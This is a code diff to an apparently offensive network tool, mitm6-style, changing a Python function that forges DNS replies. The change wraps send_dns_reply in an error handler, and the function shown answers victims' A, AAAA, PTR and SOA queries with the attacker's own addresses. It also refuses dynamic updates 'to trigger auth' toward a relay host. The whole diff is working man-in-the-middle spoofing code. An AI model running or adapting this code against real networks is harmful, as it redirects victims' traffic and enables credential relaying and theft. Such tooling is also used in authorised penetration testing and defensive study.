@@ -180,60 +180,62 @@ def send_dns_reply(p):
         ip = p[IP]
         resp = Ether(dst=p.src, src=p.dst)/IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)
     dns = p[DNS]
+    try:
     # only reply to IN, and to messages that dont contain answers
-    if dns.qd.qclass != 1 or dns.qr != 0:
-        return
+        if dns.qd.qclass != 1 or dns.qr != 0:
+            return
     # Make sure the requested name is in unicode here
-    reqname = dns.qd.qname.decode()
+        reqname = dns.qd.qname.decode()
     # A query
-    if dns.qd.qtype == 1:
-        rdata = config.selfipv4
+        if dns.qd.qtype == 1:
+            rdata = config.selfipv4
     # AAAA query
-    elif dns.qd.qtype == 28:
-        rdata = config.selfaddr
+        elif dns.qd.qtype == 28:
+            rdata = config.selfaddr
     # PTR query
-    elif dns.qd.qtype == 12:
+        elif dns.qd.qtype == 12:
         # To reply for PTR requests for our own hostname
         # comment the return statement
-        return
-        if reqname == config.selfptr:
+            return
+            if reqname == config.selfptr:
             #We reply with attacker.domain
-            rdata = 'attacker.%s' % config.localdomain
+                rdata = 'attacker.%s' % config.localdomain
+            else:
+                return
+    # SOA query
+        elif dns.qd.qtype == 6 and config.relay:
+            if dns.opcode == 5:
+                if config.verbose or config.debug:
+                    print('Dynamic update found, refusing it to trigger auth')
+                resp /= DNS(id=dns.id, qr=1, qd=dns.qd, ns=dns.ns, opcode=5, rcode=5)
+                sendp(resp, verbose=False)
+            else:
+                rdata = config.selfaddr
+                resp /= DNS(id=dns.id, qr=1, qd=dns.qd, nscount=1, arcount=1, ancount=1, an=DNSRRSOA(rrname=dns.qd.qname, ttl=100, mname="%s." % config.relay, rname="mitm6", serial=1337, type=dns.qd.qtype),
+                            ns=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=config.relay, type=2),
+                            ar=DNSRR(rrname=config.relay, type=1, rclass=1, ttl=300, rdata=config.selfipv4))
+                sendp(resp, verbose=False)
+                if config.verbose or config.debug:
+                    print('Sent SOA reply')
+            return
+    #Not handled
         else:
             return
-    # SOA query
-    elif dns.qd.qtype == 6 and config.relay:
-        if dns.opcode == 5:
-            if config.verbose or config.debug:
-                print('Dynamic update found, refusing it to trigger auth')
-            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, ns=dns.ns, opcode=5, rcode=5)
-            sendp(resp, verbose=False)
+        if should_spoof_dns(reqname):
+            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata, type=dns.qd.qtype))
+            try:
+                sendp(resp, iface=config.default_if, verbose=False)
+            except socket.error as e:
+                print('Error sending spoofed DNS')
+                print(e)
+                if config.debug:
+                    ls(resp)
+            print('Sent spoofed reply for %s to %s' % (reqname, ip.src))
         else:
-            rdata = config.selfaddr
-            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, nscount=1, arcount=1, ancount=1, an=DNSRRSOA(rrname=dns.qd.qname, ttl=100, mname="%s." % config.relay, rname="mitm6", serial=1337, type=dns.qd.qtype),
-                        ns=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=config.relay, type=2),
-                        ar=DNSRR(rrname=config.relay, type=1, rclass=1, ttl=300, rdata=config.selfipv4))
-            sendp(resp, verbose=False)
             if config.verbose or config.debug:
-                print('Sent SOA reply')
-        return
-    #Not handled
-    else:
-        return
-    if should_spoof_dns(reqname):
-        resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata, type=dns.qd.qtype))
-        try:
-            sendp(resp, iface=config.default_if, verbose=False)
-        except socket.error as e:
-            print('Error sending spoofed DNS')
-            print(e)
-            if config.debug:
-                ls(resp)
-        print('Sent spoofed reply for %s to %s' % (reqname, ip.src))
-    else:
-        if config.verbose or config.debug:
-            print('Ignored query for %s from %s' % (reqname, ip.src))
-
+                print('Ignored query for %s from %s' % (reqname, ip.src))
+    except builtins.AttributeError: # this should keep your console from getting blown up with errors
+        pass
 # Helper function to check whether any element in the list "matches" value
 def matches_list(value, target_list):
     testvalue = value.lower()
